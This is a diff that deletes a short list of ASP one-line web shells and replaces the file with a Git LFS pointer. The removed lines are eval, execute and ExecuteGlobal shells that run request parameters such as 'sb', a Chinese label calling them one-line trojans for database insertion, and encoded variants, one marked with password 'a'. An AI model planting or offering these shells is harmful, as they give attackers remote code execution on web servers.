@@ -1,16 +1,3 @@
-ASP
-
-<%eval request("sb")%>
-
-<%execute request("sb")%>
-
-%><%Eval(Request(chr(35)))%><%
-
-<%ExecuteGlobal request("sb")%>
-
-在数据库里插入的一句话木马
-
-┼攠數畣整爠煥敵瑳∨∣┩愾
-
-┼癥污爠煥敵瑳∨≡┩> 密码为: a
-
+version https://git-lfs.github.com/spec/v1
+oid sha256:a9a19d9deb874e93bcf7af6b0305c1ef721fff44039c2f608a456fa26868b3a4
+size 249
